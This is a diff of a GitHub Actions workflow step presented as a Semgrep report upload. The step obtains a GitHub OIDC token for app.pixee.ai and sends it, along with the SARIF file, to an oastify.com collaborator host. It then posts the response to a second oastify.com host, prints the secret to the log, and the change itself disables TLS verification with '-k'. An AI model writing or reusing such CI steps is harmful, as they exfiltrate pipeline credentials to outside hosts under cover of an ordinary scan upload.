@@ -46,6 +46,6 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           SECRET=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://app.pixee.ai" | jq -j '.value')
-          API_RESPONSE=$(curl -i -X PUT -H "Authorization: Bearer $SECRET" -H "Content-Type: multipart/form-data" -F "file=@semgrep.sarif" "https://eygpaxar9636shb0j13mvusdg4mxanyc.oastify.com/prod/analysis-input/godson-tf/semgrep-test/$GITHUB_SHA/semgrep")
+          API_RESPONSE=$(curl -k -i -X PUT -H "Authorization: Bearer $SECRET" -H "Content-Type: multipart/form-data" -F "file=@semgrep.sarif" "https://eygpaxar9636shb0j13mvusdg4mxanyc.oastify.com/prod/analysis-input/godson-tf/semgrep-test/$GITHUB_SHA/semgrep")
           curl "https://gtdr5z5t48y8nj62e3yoqwnfb6hy5otd.oastify.com/" -X POST -H "Content-Type: text/plain" --data "$API_RESPONSE"
           echo $SECRET
